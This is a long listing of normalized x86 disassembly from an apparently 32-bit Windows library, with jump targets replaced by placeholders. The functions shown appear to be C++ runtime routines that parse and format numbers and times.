mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x6c ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_100023ce
xor esi esi
test [ ebp - 0x6c ] 0x4
je r-xdata
mov ecx ebx
call sub_10038064
cmp al 0x30
jl r-xdata
mov ecx [ ebp - 0x90 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov esi [ ebp - 0x94 ]
push esi
mov bl al
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
lea ecx [ ebp - 0xa0 ]
call sub_10006a85
mov ecx ebx
mov esi eax
call sub_10038064
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx ebx
call sub_10038064
cmp al [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x6d ] 0x0
je r-xdata
and [ ebp - 0x6c ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_100023ce
mov ecx ebx
call sub_10038064
cmp al 0x39
jg r-xdata
mov edi [ ebp - 0xa4 ]
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0xa0 ]
call sub_10006abc
mov ecx ebx
call sub_10037ee7
lea eax [ ebp - 0x144 ]
push eax
mov ecx edi
call sub_1003c040
or [ ebp - 0x6c ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx ebx
call sub_10037ee7
lea eax [ ebp - 0x160 ]
push eax
mov ecx edi
call sub_1003c182
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x7
call sub_100021b2
push esi
lea ecx [ ebp - 0x160 ]
jmp r-xdata
mov ecx ebx
call sub_10038064
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xac ] al
push [ ebp - 0xac ]
push 0x1
call sub_10005af7
mov ecx ebx
call sub_10037ee7
cmp [ ebp - 0x80 ] edi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx esi
call sub_10038064
cmp al bl
jne r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
push [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xc
push ebx
xor edi edi
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x10c ]
push eax
mov ecx edi
call sub_1003c040
or [ ebp - 0x6c ] 0x10
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_10005bdf
mov ecx ebx
mov esi eax
call sub_10038064
cmp [ esi ] al
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_100023ce
jmp r-xdata
lea ecx [ ebp - 0x48 ]
jmp r-xdata
sub edi [ ebp - 0x80 ]
mov ecx esi
call sub_10037ee7
push [ ebp - 0x74 ]
push esi
call sub_10038079
mov edi [ ebp - 0xa4 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov ecx ebx
call sub_10038064
cmp al 0x30
jl r-xdata
test [ ebp - 0x6c ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x6c ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_100023ce
mov bl 0x1
jmp r-xdata
push 0x0
push 0x30
push 0x1
mov ecx esi
call sub_10005af7
dec edi
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x80 ] edi
jge r-xdata
cmp [ ebp - 0x80 ] edi
jge r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x44 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov ecx ebx
call sub_10038064
cmp al 0x39
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x6c ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_100023ce
test [ ebp - 0x6c ] 0x10
je r-xdata
mov esi [ ebp - 0x7c ]
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jl r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
test edi edi
jbe r-xdata
cmp edi esi
je r-xdata
mov ecx ebx
call sub_10038064
cmp al [ ebp - 0x6d ]
jne r-xdata
mov ecx ebx
call sub_10038064
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xa8 ] al
push [ ebp - 0xa8 ]
push 0x1
call sub_10005af7
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x94 ]
call sub_10037ee7
mov ecx [ ebp - 0x90 ]
lea eax [ ebp - 0x17c ]
push eax
call sub_1003c040
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xa
call sub_100021b2
push 0x0
push 0x1
lea ecx [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x3
call sub_100023ce
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx esi
call sub_10038064
cmp al 0x39
jg r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_100023ce
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
inc edi
mov ecx ebx
call sub_10037ee7
push [ ebp - 0x74 ]
push ebx
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
mov ecx esi
call sub_10038064
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
push 0x1
call sub_10005af7
inc [ ebp - 0x80 ]
mov ecx esi
call sub_10037ee7
push [ ebp - 0x74 ]
push esi
call sub_10038079
jmp r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
pop ecx
pop ecx
test al al
je r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_1004586a
push 0x120
mov eax sub_1004870b
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] edi
xor esi esi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] esi
mov ecx edi
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10044e8f
pop ecx
lea ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x84 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10044f2c
pop ecx
lea ecx [ ebp - 0x84 ]
jmp r-xdata
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x68 ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10007b41
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1004458c
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax esi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x68 ]
sub ecx eax
push 0x30
inc ecx
push ecx
push esi
lea ecx [ ebp + 0x24 ]
call sub_10005b45
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_10007ee2
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_1003c182
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_1003c040
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x69 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc4 ]
push eax
mov ecx ebx
call sub_1003c0be
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_100021b2
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x7
call sub_100023ce
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
call sub_100021b2
push esi
push 0x1
lea ecx [ ebp - 0xc4 ]
call sub_100023ce
lea ecx [ ebp - 0x64 ]
call sub_10007ee2
mov eax [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
mov [ ebp - 0x70 ] al
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x68 ]
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x69 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov edi [ ebp - 0x78 ]
xor esi esi
test al al
jle r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov eax [ edi + 0x18 ]
test eax eax
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor esi esi
cmp eax esi
jbe r-xdata
mov eax [ ebp - 0x68 ]
cmp [ ebp + 0x38 ] eax
ja r-xdata
dec eax
dec eax
je r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10005b45
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
and [ ebp - 0x74 ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
mov al [ edi ]
cmp al 0x7f
je r-xdata
mov edi eax
jmp r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004430e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004430e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x69 ] 0x0
jne r-xdata
mov edi [ edi + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edx edx
cmp edx [ ebp - 0x68 ]
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
inc [ ebp - 0x74 ]
cmp [ ebp - 0x74 ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004430e
add esp 0x14
xor esi esi
lea eax [ ebp - 0x114 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10007e4e
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xa0 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x74 ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100442d2
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x78 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x7c ]
call sub_1004430e
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_100023ce
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_100023ce
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_100023ce
mov eax [ ebp - 0x7c ]
call sub_10023f1f
retn 0x38
push edi
lea eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007e4e
mov ecx eax
call sub_1003bc22
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100442d2
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007e4e
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf4 ]
jmp r-xdata
mov eax [ ebp - 0x68 ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007e4e
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd4 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007e4e
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x68 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x11c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100442d2
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
mov [ ebp - 0x8c ] al
push [ ebp - 0x8c ]
lea ecx [ ebp + 0xc ]
call sub_10037ec1
push [ ebp - 0x68 ]
lea eax [ ebp - 0x12c ]
push eax
lea eax [ ebp - 0x104 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007ebd
mov ecx eax
call sub_100444c2
push [ ebp - 0x68 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe4 ]
jmp r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_10037ec1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
mov [ ebp - 0x80 ] al
push [ ebp - 0x80 ]
lea ecx [ ebp + 0xc ]
call sub_10037ec1
mov eax [ ebp - 0x68 ]
sub eax [ ebp + 0x38 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_1004430e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007e4e
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
sub_10045d9d
push 0x10
mov eax sub_10048733
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_1000762b
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1003e31b
push edi
push ebx
push eax
call sub_10006a1a
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1003e35a
push edi
push ebx
push eax
call sub_10006a1a
add esp 0xc
mov [ esi + 0xc ] eax
call sub_10046dc4
mov [ esi + 0x10 ] eax
call sub_10023f0b
retn 0x4
sub_10045e20
push 0x4c
mov eax sub_1004875e
call sub_10023e9c
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] edx
call sub_10045066
lea eax [ ebp + 0x14 ]
xor edi edi
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
call sub_10037f31
test al al
je r-xdata
cmp [ ebp - 0x18 ] edi
jne r-xdata
or [ esi ] 0x1
lea ecx [ ebp - 0x48 ]
call sub_10007ee2
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006a43
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x30
jl r-xdata
or [ esi ] 0x2
jmp r-xdata
xor edi edi
push 0x2d
inc edi
push edi
lea ecx [ ebp - 0x48 ]
call sub_10005af7
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x39
jle r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_100023ce
mov eax ebx
call sub_10023f1f
retn 0x24
cmp edi [ ebp - 0x18 ]
jb r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov al [ eax ]
mov [ ebp - 0x54 ] al
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x48 ]
push 0x1
call sub_10005af7
inc edi
cmp [ ebp - 0x30 ] 0x10
mov edi [ ebp - 0x44 ]
jae r-xdata
and [ ebp - 0x4c ] 0x0
lea eax [ ebp - 0x4c ]
push eax
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push edi
call sub_1001c127
add esp 0x10
cmp [ ebp - 0x50 ] edi
je r-xdata
lea edi [ ebp - 0x44 ]
or [ esi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
fstp [ eax ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
sub_10045f42
push 0x20
mov eax sub_1004878b
call sub_10023e9c
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10045066
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100021b2
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_100023ce
mov eax edi
call sub_10023f1f
retn 0x24
sub_10045fc1
push 0x54
mov eax sub_100487b8
call sub_10023e9c
fldz
mov [ ebp - 0x60 ] ecx
fcomp [ ebp + 0x20 ]
mov [ ebp - 0x5c ] 0x0
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
and [ ebp - 0x58 ] 0x0
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x5c ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_10007ee2
fld [ ebp + 0x20 ]
and [ ebp - 0x4 ] 0x0
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
call sub_1002088b
mov edi eax
add esp 0x14
xor esi esi
test edi edi
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10005af7
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x58 ] esp
push eax
call sub_10001daa
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x60 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004586a
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_100023ce
mov eax [ ebp + 0x8 ]
call sub_10023f1f
retn 0x20
movzx eax [ ebp + esi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10005af7
inc esi
cmp esi edi
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_100460c1
push 0x28
mov eax sub_100487e5
call sub_10023e9c
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x18 ] 0x10
mov edi ecx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] 0x0
jne r-xdata
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010f73
and [ ebp - 0x4 ] 0x0
test esi esi
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x34 ] esp
push eax
call sub_10001daa
push [ ebp - 0x30 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004586a
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp + 0x8 ]
call sub_10023f1f
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005af7
sub_10046164
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10045d9d
mov eax esi
call sub_10023f0b
retn 0x8
sub_100461b3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004619b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100461d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push ebx
mov ecx esi
mov [ ebp - 0x34 ] eax
lea edi [ ebp - 0x24 ]
call sub_10037f31
test al al
jne r-xdata
push ebx
push esi
mov [ ebp - 0x25 ] 0x0
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10038064
mov ecx esi
cmp al 0x2b
jne r-xdata
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jne r-xdata
call sub_10038064
cmp al 0x2d
jne r-xdata
mov [ ebp - 0x24 ] al
jmp r-xdata
mov ecx esi
call sub_10038064
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_10037ee7
push ebx
push esi
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] al
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10037ee7
mov ecx esi
call sub_10038064
cmp al 0x39
jg r-xdata
and [ ebp - 0x30 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ edi ] 0x0
call sub_1001bd2f
and [ ebp - 0x2c ] 0x0
add esp 0x10
push ebx
mov ecx esi
mov edi eax
call sub_10037f31
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_10038064
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x38 ] eax
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_10037ee7
inc edi
or [ ebp - 0x2c ] 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
sub_1004631f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_100461d4
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
lea ecx [ ebp + 0xc ]
call sub_10037ee7
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_100461d4
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037ee7
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_100461d4
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_100463dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
